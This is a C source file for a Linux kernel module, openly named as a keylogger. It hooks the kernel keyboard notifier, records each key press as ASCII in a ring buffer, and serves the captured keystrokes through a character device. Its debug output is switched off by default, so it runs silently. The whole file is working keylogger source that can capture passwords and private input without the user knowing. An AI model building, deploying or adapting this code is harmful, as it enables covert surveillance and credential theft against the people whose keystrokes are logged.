/* Necessary includes for device drivers */

#include <linux/kernel.h>
#include <asm/uaccess.h>

#include "klogger.h"
#define LOUD 0
#define DEV_NAME "l0gger"
int klg_init(void) {
	int result;

	/* Registering device */
  	result = register_chrdev(KLG_MAJOR, DEV_NAME, &klg_fops);
  
	if (result < 0)
		return result;

	register_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	#if(LOUD > 0)
	printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 
	#endif
	return 0;
}

void klg_exit(void) {
	/* Freeing the major number */
	unregister_chrdev(KLG_MAJOR, DEV_NAME);

	unregister_keyboard_notifier(&nb);
	memset(buffer, 0, sizeof buffer);
	bptr = buffer;

	#if(LOUD > 0)
	printk(KERN_DEBUG "[Key logger]: Removing klg module\n");
	#endif
}

int klg_open(struct inode *inode, struct file *filp) {
	
	#if(LOUD > 0)
	printk(KERN_DEBUG "[Key logger]: Opening device\n");
	#endif
	return 0;
}

ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 

	#if(LOUD > 0)
	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");
	#endif

	char* p = buffer;
	int bytes = 0;

	while(*p != '\0') {
		bytes++;
		p++;
	}

	#if(LOUD > 0)
	printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);
	#endif
	if(bytes == 0 || *f_pos) return 0;

	int ret = copy_to_user(buf, buffer, bytes);

	if(ret) {
		
		#if(LOUD > 0)
		printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");
		#endif
		return -EFAULT;
	}

	*f_pos = 1;

	return bytes;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if(code == KBD_KEYCODE && param->down) {
		if(param-> value == KEY_BACKSPACE) {
			if(bptr != buffer) {
				--bptr;
				*bptr = '\0';
			}
		}
		else {
			char ch = get_ascii(param->value);
			if(ch != 'X') {
				*bptr = ch;
				bptr++;
				if(bptr == endptr) bptr = buffer;
			}
		}
	}

	return NOTIFY_OK;
}

MODULE_LICENSE("Dual BSD/GPL");

module_init(klg_init);
module_exit(klg_exit);
